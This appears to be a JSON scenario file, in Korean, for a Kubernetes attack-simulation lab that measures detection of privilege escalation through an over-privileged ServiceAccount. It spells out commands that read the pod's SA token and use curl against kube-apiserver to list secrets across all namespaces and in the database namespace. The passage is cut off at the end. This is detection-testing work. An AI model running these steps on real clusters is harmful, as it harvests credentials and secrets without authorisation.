{
  "_note": "핵심층 환경 — 킬체인 ② 권한상승(과권한 ServiceAccount). 조건 문법은 postgres.json(canonical) 참고. 심은 취약점이라 cve 없음(cwe 만). 진행도. admin-dashboard 파드의 과권한 SA 토큰으로 전 네임스페이스 secrets 조회 → 감사로그 admin-sa secrets get→T1078(가장 선명한 관측).",
  "env": "killchain-2",
  "technique": "T1078",
  "cwe": "CWE-269",
  "procedure": {
    "id": "PROC-kc2-oversa-secrets",
    "name": "과권한 SA 토큰으로 전 네임스페이스 Secret 조회",
    "description": "탈취한 admin-dashboard SA(admin-sa) 토큰으로 kube-apiserver 에 전 네임스페이스 secrets 를 get/list 해 자격증명·토큰을 수집한다.",
    "status": "AUTHORED",
    "steps": [
      {
        "id": "STEP-kc2-read-token",
        "seq": 1,
        "command": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
        "description": "admin-sa 토큰 추출"
      },
      {
        "id": "STEP-kc2-list-secrets",
        "seq": 2,
        "command": "curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/secrets",
        "description": "전 네임스페이스 secrets 열거(과권한 SA)"
      },
      {
        "id": "STEP-kc2-db-secrets",
        "seq": 3,
        "command": "curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/database/secrets",
        "description": "database 네임스페이스 자격증명 수집"
      }
    ]
  },
  "preconditions": [
    {
      "id": "PRE-kc2-oversa-token",
      "name": "과권한 SA 토큰 확보",
      "description": "admin-dashboard 파드의 SA(admin-sa)가 전 네임스페이스 secrets 조회 권한을 가지며 그 토큰을 쥐었음."
    }
  ],
  "expected_results": [
    {
      "id": "ER-kc2-progress-secrets",
      "name": "과권한 SA Secret 조회 흔적 (진행도)",
      "kind": "progress",
      "outcome": {
        "id": "AO-privilege-escalation",
        "name": "권한 상승"
      },
      "conditions": [
        {
          "channel": "audit",
          "field": "technique",
          "operator": "eq",
